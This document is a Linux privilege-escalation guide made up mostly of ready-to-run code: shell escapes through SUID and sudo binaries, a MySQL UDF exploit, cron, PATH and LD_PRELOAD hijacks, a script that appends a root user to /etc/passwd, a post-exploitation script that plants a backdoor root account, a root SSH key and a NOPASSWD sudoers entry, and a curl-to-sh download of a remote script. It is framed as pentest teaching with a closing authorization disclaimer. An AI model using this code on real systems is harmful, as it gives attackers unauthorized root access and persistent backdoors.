# Linux Privilege Escalation Guide

## Overview
This guide covers common techniques for escalating privileges on Linux systems after gaining initial access. These methods are for educational purposes and authorized testing only.

## Initial Enumeration

### System Information Gathering
```bash
# Basic system info
uname -a
cat /etc/os-release
cat /etc/passwd
cat /etc/group

# Current user and privileges
whoami
id
groups
sudo -l

# Environment variables
env
echo $PATH
echo $HOME
```

### Process and Service Enumeration
```python
#!/usr/bin/env python3
"""
Basic Linux enumeration script
"""

import subprocess
import os
import stat

def run_command(cmd):
    """Execute command and return output"""
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return result.stdout.strip()
    except:
        return ""

def check_sudo_rights():
    """Check sudo privileges"""
    print("[+] Checking sudo privileges...")
    sudo_output = run_command("sudo -l 2>/dev/null")
    if sudo_output:
        print(sudo_output)
    else:
        print("No sudo privileges or requires password")

def check_suid_files():
    """Find SUID files"""
    print("\n[+] Checking SUID files...")
    suid_files = run_command("find / -perm -4000 -type f 2>/dev/null")
    for file in suid_files.split('\n'):
        if file:
            print(f"  {file}")

def check_writable_dirs():
    """Check world-writable directories"""
    print("\n[+] Checking world-writable directories...")
    writable = run_command("find / -type d -perm -002 2>/dev/null")
    for dir in writable.split('\n')[:10]:  # Show first 10
        if dir:
            print(f"  {dir}")

def check_running_services():
    """Check running services"""
    print("\n[+] Checking running services...")
    services = run_command("ps aux | grep -v grep")
    interesting = ['root', 'mysql', 'apache', 'nginx', 'ssh']
    
    for line in services.split('\n'):
        for service in interesting:
            if service in line.lower():
                print(f"  {line}")
                break

def check_network():
    """Check network connections"""
    print("\n[+] Checking network connections...")
    netstat = run_command("netstat -tulpn 2>/dev/null")
    print(netstat[:500] + "..." if len(netstat) > 500 else netstat)

def main():
    print("=== Linux Privilege Escalation Enumeration ===")
    check_sudo_rights()
    check_suid_files()
    check_writable_dirs()
    check_running_services()
    check_network()

if __name__ == "__main__":
    main()
```

## Common Privilege Escalation Methods

### 1. SUID/SGID Exploitation

#### Finding SUID Binaries
```bash
# Find all SUID files
find / -perm -4000 -type f 2>/dev/null

# Find SGID files
find / -perm -2000 -type f 2>/dev/null

# Combine both
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
```

#### Common SUID Exploits
```bash
# If find has SUID
find . -exec /bin/sh \; -quit

# If vim/nano has SUID
vim -c ':!/bin/sh'

# If less/more has SUID
less /etc/passwd
!/bin/sh

# If cp has SUID
cp /bin/bash /tmp/bash
/tmp/bash -p

# If python has SUID
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

### 2. Sudo Exploitation

#### Check Sudo Configuration
```bash
# Check what you can run as sudo
sudo -l

# Check sudoers file (if readable)
cat /etc/sudoers
```

#### Common Sudo Exploits
```bash
# If sudo vim is allowed
sudo vim -c ':!/bin/sh'

# If sudo find is allowed
sudo find . -exec /bin/sh \; -quit

# If sudo python is allowed
sudo python -c 'import os; os.system("/bin/sh")'

# If sudo less is allowed
sudo less /etc/passwd
!/bin/sh

# If sudo awk is allowed
sudo awk 'BEGIN {system("/bin/sh")}'
```

### 3. Kernel Exploits

#### Kernel Version Check
```bash
# Check kernel version
uname -a
cat /proc/version

# Check for known vulnerabilities
searchsploit linux kernel $(uname -r)
```

#### Common Kernel Exploits
```python
#!/usr/bin/env python3
"""
Kernel exploit checker
"""

import subprocess
import re

def get_kernel_version():
    """Get kernel version"""
    try:
        output = subprocess.check_output(['uname', '-r']).decode().strip()
        return output
    except:
        return None

def check_dirty_cow():
    """Check for Dirty COW vulnerability (CVE-2016-5195)"""
    kernel = get_kernel_version()
    if kernel:
        # Vulnerable versions: < 4.8.3, 4.7.9, 4.4.26
        print(f"[+] Kernel version: {kernel}")
        print("[+] Check manually for Dirty COW vulnerability")
        print("    Compile and run: https://github.com/dirtycow/dirtycow.github.io")

def check_overlayfs():
    """Check for OverlayFS vulnerability (CVE-2015-1328)"""
    print("[+] Checking for OverlayFS exploit...")
    try:
        # Check if overlayfs is available
        output = subprocess.check_output(['cat', '/proc/filesystems']).decode()
        if 'overlay' in output:
            print("    OverlayFS available - check CVE-2015-1328")
    except:
        pass

def main():
    print("=== Kernel Exploit Checker ===")
    check_dirty_cow()
    check_overlayfs()

if __name__ == "__main__":
    main()
```

### 4. Service Exploits

#### MySQL UDF Privilege Escalation
```python
#!/usr/bin/env python3
"""
MySQL UDF privilege escalation example
"""

import pymysql
import os

def mysql_udf_exploit(host, user, password, database):
    """Exploit MySQL UDF for privilege escalation"""
    try:
        # Connect to MySQL
        conn = pymysql.connect(host=host, user=user, password=password, db=database)
        cursor = conn.cursor()
        
        # Create UDF function
        udf_code = """
        CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys.so';
        """
        
        # Execute system command
        cursor.execute("SELECT sys_exec('chmod +s /bin/bash');")
        
        print("[+] UDF exploit executed - check /bin/bash SUID")
        
        conn.close()
        
    except Exception as e:
        print(f"[-] MySQL UDF exploit failed: {e}")

# Usage example (if you have MySQL credentials)
# mysql_udf_exploit('localhost', 'username', 'password', 'database')
```

### 5. Cron Job Exploitation

#### Check Cron Jobs
```bash
# Check user cron jobs
crontab -l

# Check system cron jobs
cat /etc/crontab
ls -la /etc/cron.*
cat /etc/cron.d/*

# Check running cron processes
ps aux | grep cron
```

#### Cron Job Exploitation Script
```python
#!/usr/bin/env python3
"""
Cron job exploitation checker
"""

import os
import stat
import subprocess

def check_cron_permissions():
    """Check cron job file permissions"""
    cron_dirs = [
        '/etc/cron.d',
        '/etc/cron.daily',
        '/etc/cron.hourly',
        '/etc/cron.monthly',
        '/etc/cron.weekly'
    ]
    
    print("[+] Checking cron job permissions...")
    
    for cron_dir in cron_dirs:
        if os.path.exists(cron_dir):
            for file in os.listdir(cron_dir):
                file_path = os.path.join(cron_dir, file)
                try:
                    file_stat = os.stat(file_path)
                    file_mode = stat.filemode(file_stat.st_mode)
                    
                    # Check if writable by others
                    if file_stat.st_mode & stat.S_IWOTH:
                        print(f"  [!] World-writable: {file_path} ({file_mode})")
                    
                    # Check if writable by group
                    elif file_stat.st_mode & stat.S_IWGRP:
                        print(f"  [*] Group-writable: {file_path} ({file_mode})")
                        
                except Exception as e:
                    print(f"  [-] Error checking {file_path}: {e}")

def exploit_writable_cron(file_path):
    """Exploit writable cron job"""
    backup_payload = """#!/bin/bash
# Backup script
cp /bin/bash /tmp/backup_bash
chmod +s /tmp/backup_bash
"""
    
    try:
        with open(file_path, 'w') as f:
            f.write(backup_payload)
        print(f"[+] Malicious payload written to {file_path}")
        print("[+] Wait for cron execution, then run: /tmp/backup_bash -p")
    except Exception as e:
        print(f"[-] Failed to write payload: {e}")

if __name__ == "__main__":
    check_cron_permissions()
```

### 6. Environment Variable Exploitation

#### PATH Hijacking
```python
#!/usr/bin/env python3
"""
PATH hijacking example
"""

import os
import stat

def path_hijacking():
    """Demonstrate PATH hijacking"""
    # Find SUID binaries that might call other programs
    print("[+] Looking for SUID binaries that might be vulnerable to PATH hijacking...")
    
    # Check if we can write to directories in PATH
    path_dirs = os.environ.get('PATH', '').split(':')
    
    for directory in path_dirs:
        if os.path.exists(directory):
            try:
                # Check if directory is writable
                if os.access(directory, os.W_OK):
                    print(f"  [!] Writable PATH directory: {directory}")
                    
                    # Create malicious binary
                    fake_binary = os.path.join(directory, 'service')  # Common binary name
                    
                    with open(fake_binary, 'w') as f:
                        f.write('#!/bin/bash\ncp /bin/bash /tmp/bash\nchmod +s /tmp/bash\n')
                    
                    os.chmod(fake_binary, 0o755)
                    print(f"    [+] Created malicious binary: {fake_binary}")
                    
            except Exception as e:
                print(f"    [-] Error with {directory}: {e}")

def ld_preload_exploitation():
    """LD_PRELOAD exploitation example"""
    
    # Check if LD_PRELOAD is preserved in sudo
    sudo_env = os.popen('sudo -l 2>/dev/null | grep env_keep').read()
    
    if 'LD_PRELOAD' in sudo_env:
        print("[+] LD_PRELOAD is preserved in sudo environment")
        
        # Create malicious shared library
        malicious_c = """
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
"""
        
        # Write C code
        with open('/tmp/shell.c', 'w') as f:
            f.write(malicious_c)
        
        # Compile
        os.system('gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles')
        
        print("[+] Malicious library created: /tmp/shell.so")
        print("[+] Run: sudo LD_PRELOAD=/tmp/shell.so <any-sudo-command>")

if __name__ == "__main__":
    path_hijacking()
    ld_preload_exploitation()
```

### 7. File Permission Exploitation

#### World-Writable Files
```bash
# Find world-writable files
find / -perm -2 -type f 2>/dev/null

# Find files with no owner
find / -nouser -o -nogroup 2>/dev/null

# Check /etc/passwd permissions
ls -la /etc/passwd /etc/shadow /etc/group
```

#### Passwd File Exploitation
```python
#!/usr/bin/env python3
"""
/etc/passwd exploitation
"""

import crypt
import os

def check_passwd_writable():
    """Check if /etc/passwd is writable"""
    if os.access('/etc/passwd', os.W_OK):
        print("[+] /etc/passwd is writable!")
        
        # Generate password hash
        password = "pwned123"
        salt = "evil"
        hashed = crypt.crypt(password, salt)
        
        # Create new root user entry
        new_user = f"hacker::{hashed}:0:0:root:/root:/bin/bash\n"
        
        try:
            with open('/etc/passwd', 'a') as f:
                f.write(new_user)
            print(f"[+] Added user 'hacker' with password '{password}'")
            print("[+] Switch user with: su hacker")
        except Exception as e:
            print(f"[-] Failed to write to /etc/passwd: {e}")
    else:
        print("[-] /etc/passwd is not writable")

if __name__ == "__main__":
    check_passwd_writable()
```

## Automated Privilege Escalation Tools

### LinPEAS (Linux Privilege Escalation Awesome Script)
```bash
# Download and run LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Or download and run locally
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### Linux Exploit Suggester
```bash
# Download
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh

# Run
bash linux-exploit-suggester.sh
```

### Custom Enumeration Script
```python
#!/usr/bin/env python3
"""
Comprehensive Linux privilege escalation enumeration
"""

import os
import subprocess
import stat
import pwd
import grp

class PrivEscChecker:
    def __init__(self):
        self.findings = []
    
    def run_command(self, cmd):
        """Execute command safely"""
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            return result.stdout.strip()
        except:
            return ""
    
    def add_finding(self, category, description, severity="INFO"):
        """Add finding to results"""
        self.findings.append({
            'category': category,
            'description': description,
            'severity': severity
        })
    
    def check_sudo_rights(self):
        """Check sudo privileges"""
        sudo_output = self.run_command("sudo -l 2>/dev/null")
        if sudo_output and "NOPASSWD" in sudo_output:
            self.add_finding("SUDO", f"NOPASSWD sudo rights found: {sudo_output}", "HIGH")
        elif sudo_output:
            self.add_finding("SUDO", f"Sudo rights found: {sudo_output}", "MEDIUM")
    
    def check_suid_files(self):
        """Check for interesting SUID files"""
        suid_files = self.run_command("find / -perm -4000 -type f 2>/dev/null")
        interesting_suid = ['vim', 'nano', 'find', 'python', 'perl', 'ruby', 'less', 'more']
        
        for file in suid_files.split('\n'):
            for interesting in interesting_suid:
                if interesting in file:
                    self.add_finding("SUID", f"Interesting SUID binary: {file}", "HIGH")
    
    def check_writable_files(self):
        """Check for writable system files"""
        important_files = ['/etc/passwd', '/etc/shadow', '/etc/sudoers', '/etc/crontab']
        
        for file in important_files:
            if os.path.exists(file) and os.access(file, os.W_OK):
                self.add_finding("WRITABLE", f"Critical file is writable: {file}", "CRITICAL")
    
    def check_cron_jobs(self):
        """Check for vulnerable cron jobs"""
        cron_dirs = ['/etc/cron.d', '/etc/cron.daily', '/etc/cron.hourly']
        
        for cron_dir in cron_dirs:
            if os.path.exists(cron_dir):
                for file in os.listdir(cron_dir):
                    file_path = os.path.join(cron_dir, file)
                    if os.access(file_path, os.W_OK):
                        self.add_finding("CRON", f"Writable cron job: {file_path}", "HIGH")
    
    def check_kernel_version(self):
        """Check kernel version for known exploits"""
        kernel = self.run_command("uname -r")
        if kernel:
            # Simple version checking (expand as needed)
            if "3." in kernel or "4.4" in kernel:
                self.add_finding("KERNEL", f"Potentially vulnerable kernel: {kernel}", "MEDIUM")
    
    def check_running_services(self):
        """Check for vulnerable services"""
        processes = self.run_command("ps aux")
        vulnerable_services = ['mysql', 'apache2', 'nginx', 'ssh']
        
        for service in vulnerable_services:
            if service in processes and 'root' in processes:
                self.add_finding("SERVICES", f"Service running as root: {service}", "MEDIUM")
    
    def generate_report(self):
        """Generate findings report"""
        print("=" * 60)
        print("          LINUX PRIVILEGE ESCALATION REPORT")
        print("=" * 60)
        
        if not self.findings:
            print("No significant findings.")
            return
        
        # Sort by severity
        severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "INFO": 3}
        self.findings.sort(key=lambda x: severity_order.get(x['severity'], 99))
        
        current_category = ""
        for finding in self.findings:
            if finding['category'] != current_category:
                print(f"\n[{finding['category']}]")
                current_category = finding['category']
            
            severity_marker = "!!!" if finding['severity'] == "CRITICAL" else \
                            "!!" if finding['severity'] == "HIGH" else \
                            "!" if finding['severity'] == "MEDIUM" else ""
            
            print(f"  {severity_marker} {finding['description']}")
    
    def run_full_check(self):
        """Run all privilege escalation checks"""
        print("[+] Running privilege escalation enumeration...")
        
        self.check_sudo_rights()
        self.check_suid_files()
        self.check_writable_files()
        self.check_cron_jobs()
        self.check_kernel_version()
        self.check_running_services()
        
        self.generate_report()

if __name__ == "__main__":
    checker = PrivEscChecker()
    checker.run_full_check()
```

## Post-Exploitation Actions

### Maintaining Root Access
```python
#!/usr/bin/env python3
"""
Post-exploitation root access maintenance
"""

import os
import subprocess
import crypt

def create_backdoor_user():
    """Create backdoor user with root privileges"""
    username = "service"
    password = "backup123"
    
    # Generate password hash
    salt = "$6$evil$"
    hashed_password = crypt.crypt(password, salt)
    
    # Add user to /etc/passwd
    user_entry = f"{username}:x:0:0:System Service:/root:/bin/bash\n"
    
    try:
        with open('/etc/passwd', 'a') as f:
            f.write(user_entry)
        
        # Add password to /etc/shadow
        shadow_entry = f"{username}:{hashed_password}:18000:0:99999:7:::\n"
        with open('/etc/shadow', 'a') as f:
            f.write(shadow_entry)
        
        print(f"[+] Backdoor user '{username}' created with password '{password}'")
    except Exception as e:
        print(f"[-] Failed to create backdoor user: {e}")

def install_ssh_key():
    """Install SSH key for persistent access"""
    ssh_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... your-public-key"
    
    # Install for root
    os.makedirs('/root/.ssh', exist_ok=True)
    
    with open('/root/.ssh/authorized_keys', 'a') as f:
        f.write(f"\n{ssh_key}\n")
    
    os.chmod('/root/.ssh/authorized_keys', 0o600)
    os.chmod('/root/.ssh', 0o700)
    
    print("[+] SSH key installed for root access")

def modify_sudoers():
    """Add backdoor to sudoers"""
    sudoers_entry = "service ALL=(ALL) NOPASSWD: ALL\n"
    
    try:
        with open('/etc/sudoers', 'a') as f:
            f.write(sudoers_entry)
        print("[+] Sudoers backdoor installed")
    except Exception as e:
        print(f"[-] Failed to modify sudoers: {e}")

if __name__ == "__main__":
    if os.geteuid() == 0:
        print("[+] Running as root - installing backdoors...")
        create_backdoor_user()
        install_ssh_key()
        modify_sudoers()
    else:
        print("[-] Need root privileges to install backdoors")
```

## Important Notes

⚠️ **Legal and Ethical Considerations:**
- Only use these techniques on systems you own or have explicit written authorization to test
- These are common privilege escalation methods that security professionals should understand
- Always follow responsible disclosure practices when finding vulnerabilities
- Document all activities for legitimate penetration testing reports

⚠️ **Technical Considerations:**
- Modern Linux systems have multiple protection mechanisms (ASLR, DEP, etc.)
- Many of these techniques require specific conditions to be exploitable
- Always test in isolated lab environments first
- Keep privilege escalation tools updated as new techniques are discovered

⚠️ **Detection Considerations:**
- Most of these activities will be logged by system monitoring
- Use these techniques responsibly to improve security posture
- Implement proper monitoring to detect these activities in production systems